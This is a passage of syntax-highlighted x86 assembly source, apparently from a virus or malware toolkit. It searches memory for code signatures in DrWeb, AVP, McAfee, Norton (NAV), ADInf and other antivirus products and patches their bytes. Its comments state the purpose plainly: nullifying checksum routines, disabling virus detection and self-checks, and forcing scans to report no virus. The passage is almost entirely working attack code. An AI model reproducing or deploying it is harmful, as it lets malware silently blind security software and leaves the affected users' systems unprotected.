                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">75FF0CC4h</span><span class="sc0">  </span><span class="sc1">; NAV</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__patch7</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7502F883h</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__patch8</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7503F883h</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__patch8</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01E32D88Ah</span><span class="sc0"> </span><span class="sc1">; ADINF</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__patch9</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08B08E8C1h</span><span class="sc0"> </span><span class="sc1">; AVPI</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__patch10</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08B08E9C1h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__patch10</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BE1Fh</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__patch11</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">016CDC033h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__patch12</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFF013E8h</span><span class="sc0"> </span><span class="sc1">; AVT</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__patch13</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">70BFE88Bh</span><span class="sc0">  </span><span class="sc1">; MTX (SABI¡-I)</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__patch14</span><span class="sc0">

</span><span class="sc5">__continue</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__cycle</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">.popa_eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">     </span><span class="sc1">; popa.eax</span><span class="sc0">

                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">; DRWEB -- std-csum</span><span class="sc0">

</span><span class="sc1">;[30 D6                 xor     dh, dl</span><span class="sc0">
</span><span class="sc1">; 30 E2]                xor     dl, ah</span><span class="sc0">
</span><span class="sc1">; 30 C4                 xor     ah, al</span><span class="sc0">
</span><span class="sc1">; .. ..</span><span class="sc0">
</span><span class="sc1">; 30 F0                 xor     al, dh  --&gt;   00 F0   add al, dh</span><span class="sc0">

</span><span class="sc5">__patch1</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0C430h</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__continue</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
</span><span class="sc5">__a1</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0F030h</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__a2</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__a1</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__continue</span><span class="sc0">
</span><span class="sc5">__a2</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__continue</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">; AVP -- lancrypto-csum</span><span class="sc0">

</span><span class="sc1">; 7507                  jne     xxxxxxxx</span><span class="sc0">
</span><span class="sc1">; 40                    inc     eax</span><span class="sc0">
</span><span class="sc1">; 663D0900              cmp     ax, 9</span><span class="sc0">
</span><span class="sc1">; 72E6                  jb      xxxxxxxx</span><span class="sc0">
</span><span class="sc1">; 662D0900              sub     ax, 9</span><span class="sc0">
</span><span class="sc1">; 5F                    pop     edi</span><span class="sc0">
</span><span class="sc1">; 66F7D8                neg     ax</span><span class="sc0">
</span><span class="sc1">; 1BC0                  sbb     eax, eax      --&gt; 33 C0 == xor eax, eax</span><span class="sc0">
</span><span class="sc1">;[5E                    pop     esi</span><span class="sc0">
</span><span class="sc1">; 249C                  and     al, 9C</span><span class="sc0">
</span><span class="sc1">; 5B]                   pop     ebx</span><span class="sc0">
</span><span class="sc1">; C9                    leave</span><span class="sc0">
</span><span class="sc1">; C3                    retn</span><span class="sc0">

</span><span class="sc5">__patch2</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0C01BD8F7h</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__continue</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__continue</span><span class="sc0">

</span><span class="sc1">; AVP -- std-csum</span><span class="sc0">

</span><span class="sc1">; 8BD0                  mov     edx, eax</span><span class="sc0">
</span><span class="sc1">; 33DB                  xor     ebx, ebx</span><span class="sc0">
</span><span class="sc1">; 8A19                  mov     bl, [ecx]</span><span class="sc0">
</span><span class="sc1">; C1E208                shl     edx, 8</span><span class="sc0">
</span><span class="sc1">;[33D3                  xor     edx, ebx</span><span class="sc0">
</span><span class="sc1">; 33C2]                 xor     eax, edx      --&gt; 33 C0  xor eax, eax</span><span class="sc0">

</span><span class="sc1">; 8D1400                lea     edx, [eax][eax]</span><span class="sc0">
</span><span class="sc1">; 8A19                  mov     bl, [ecx]</span><span class="sc0">
</span><span class="sc1">;[33D3                  xor     edx, ebx</span><span class="sc0">
</span><span class="sc1">; 33C2]                 xor     eax, edx      --&gt; 33 C0  xor eax, eax</span><span class="sc0">

</span><span class="sc5">__patch3</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">08E2C119h</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__c1</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">198A0014h</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__continue</span><span class="sc0">
</span><span class="sc5">__c1</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__continue</span><span class="sc0">

</span><span class="sc1">; AVP -- .avc csum checking</span><span class="sc0">
</span><span class="sc1">; 50                    push    eax</span><span class="sc0">
</span><span class="sc1">; 57                    push    edi</span><span class="sc0">
</span><span class="sc1">; E8xxxxxxxx            call    xxxxxxxx   ; calc_csum, which is now patched</span><span class="sc0">
</span><span class="sc1">; 8B4E18                mov     ecx, [esi+18]</span><span class="sc0">
</span><span class="sc1">; 83[C408               add     esp, 8</span><span class="sc0">
</span><span class="sc1">; 3BC8]                 cmp     ecx, eax      --&gt; 3B C9 == cmp ecx, ecx</span><span class="sc0">

</span><span class="sc5">__patch4</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">83184E8Bh</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__continue</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">9</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__continue</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0C9h</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__continue</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">; MACAFE -- disable virus-detection</span><span class="sc0">

</span><span class="sc1">; mcscan32.dll</span><span class="sc0">
</span><span class="sc1">; B801000000            mov     eax, 1           --&gt; B8 00 ...   mov eax, 0</span><span class="sc0">
</span><span class="sc1">; EB02                  jmp     xxxxxxxx</span><span class="sc0">
</span><span class="sc1">; 31C0                  xor     eax, eax</span><span class="sc0">
</span><span class="sc1">; [8987C002]0000        mov     [edi+0000002C0], eax</span><span class="sc0">

</span><span class="sc5">__patch5</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0C03102EBh</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__continue</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__continue</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__continue</span><span class="sc0">

</span><span class="sc1">; MACAFE -- disable self-check</span><span class="sc0">

</span><span class="sc1">; mcutil32.dll</span><span class="sc0">
</span><span class="sc1">; 83 C4 10              add     esp, 10h</span><span class="sc0">
</span><span class="sc1">; 3B 45 F3              cmp     eax, [ebp+csum]</span><span class="sc0">
</span><span class="sc1">; 74 07                 je      xxxxxxxx</span><span class="sc0">
</span><span class="sc1">;[C7 45 FC 01]00 00 00  mov     [ebp+res], 1</span><span class="sc0">

</span><span class="sc5">__patch6</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0774F345h</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__continue</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">3B10C483h</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__continue</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__continue</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__continue</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">; NAV -- virus-detection</span><span class="sc0">

</span><span class="sc1">; FF 75 xx              push    [ebp+xx]</span><span class="sc0">
</span><span class="sc1">; 8D 45 nn              lea     eax, [ebp+virus_id]</span><span class="sc0">
</span><span class="sc1">; 50                    push    eax</span><span class="sc0">
</span><span class="sc1">; FF 75 xx              push    [ebp+xx]</span><span class="sc0">
</span><span class="sc1">; E8 xx xx xx xx        call    xxxxxxxx ; copy_virus_name</span><span class="sc0">
</span><span class="sc1">; 83[C4 0C              add     esp, 0Ch</span><span class="sc0">
</span><span class="sc1">; FF 75]xx              push    [ebp+xx]</span><span class="sc0">
</span><span class="sc1">; E8 xx xx xx xx        call    xxxxxxxx ; _VLReleaseVirusHandle@4</span><span class="sc0">
</span><span class="sc1">; 8B 45 nn              mov     eax, [ebp+virus_id]   ; &lt;-- 33 C0 / 90</span><span class="sc0">
</span><span class="sc1">; EB xx                 jmp     xxxxxxxx              ; (xor eax, eax / nop)</span><span class="sc0">

</span><span class="sc5">__patch7</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">16</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">13</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">9</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">75FF75FFh</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">458D458Bh</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__continue</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">10</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">13</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">50h</span><span class="sc4">+</span><span class="sc2">0E8h</span><span class="sc4">+</span><span class="sc2">0E8h</span><span class="sc4">+</span><span class="sc2">0EBh</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__continue</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0EB90C033h</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__continue</span><span class="sc0">

</span><span class="sc1">; NAV -- virus-detection(#2,redundant)</span><span class="sc0">

</span><span class="sc1">;[83 F8 02||03          cmp     eax, xx   ; 2||3</span><span class="sc0">
</span><span class="sc1">; 75]xx                 jnz     xxxxxxxx         ; --&gt; EB (jmp)</span><span class="sc0">
</span><span class="sc1">; 8D 45 xx              lea     eax, [ebp+xx]</span><span class="sc0">
</span><span class="sc1">; 50                    push    eax</span><span class="sc0">
</span><span class="sc1">; FF 75 xx              push    [ebp+xx]</span><span class="sc0">
</span><span class="sc1">; 56||57                push    esi||edi</span><span class="sc0">
</span><span class="sc1">; E8 xx xx xx xx        call    xxxxxxxx  ; _VLDetermineVirusIndex@12</span><span class="sc0">
</span><span class="sc1">; 66 85 C0              test    ax, ax</span><span class="sc0">
</span><span class="sc1">; 74||75 xx             jz||jnz xxxxxxxx</span><span class="sc0">

</span><span class="sc5">__patch8</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">9</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">458D75FFh</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__continue</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">18</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">13</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0856650h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__continue</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">21</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">56h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">74h</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__continue</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__continue</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">; ADINF -- crc16/crc32</span><span class="sc0">

</span><span class="sc1">; dsavcrc.dll</span><span class="sc0">
</span><span class="sc1">; crc16</span><span class="sc0">
</span><span class="sc1">; 33 DB                 xor     ebx, ebx</span><span class="sc0">
</span><span class="sc1">;[8A D8                 mov     bl, al</span><span class="sc0">
</span><span class="sc1">; 32 1E]                xor     bl, [esi]       --&gt; 32 DB  xor bl, bl</span><span class="sc0">
</span><span class="sc1">; 46                    inc     esi</span><span class="sc0">
</span><span class="sc1">; D1 E3                 shl     ebx, 1</span><span class="sc0">
</span><span class="sc1">; 8A C4                 mov     al, ah</span><span class="sc0">
</span><span class="sc1">; 32 E4                 xor     ah, ah</span><span class="sc0">
</span><span class="sc1">; 66 33 04 1F           xor     ax, [edi+ebx]</span><span class="sc0">
</span><span class="sc1">; crc32</span><span class="sc0">
</span><span class="sc1">; 33 DB                 xor     ebx, ebx</span><span class="sc0">
</span><span class="sc1">;[8A D8                 mov     bl, al</span><span class="sc0">
</span><span class="sc1">; 32 1E]                xor     bl, [esi]       --&gt; 32 DB  xor bl, bl</span><span class="sc0">
</span><span class="sc1">; 46                    inc     esi</span><span class="sc0">
</span><span class="sc1">; C1 E3 02              shl     ebx, 2</span><span class="sc0">
</span><span class="sc1">; C1 E8 08              shr     eax, 8</span><span class="sc0">
</span><span class="sc1">; 33 04 1F              xor     eax, [edi+ebx]</span><span class="sc0">
</span><span class="sc1">; E2 EE                 loop    xxxxxxxx</span><span class="sc0">

</span><span class="sc5">__patch9</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8AE3D146h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">66E432C4h</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__d1</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02E3C146h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">3308E8C1h</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__continue</span><span class="sc0">
</span><span class="sc5">__d1</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0DBh</span><span class="sc0">
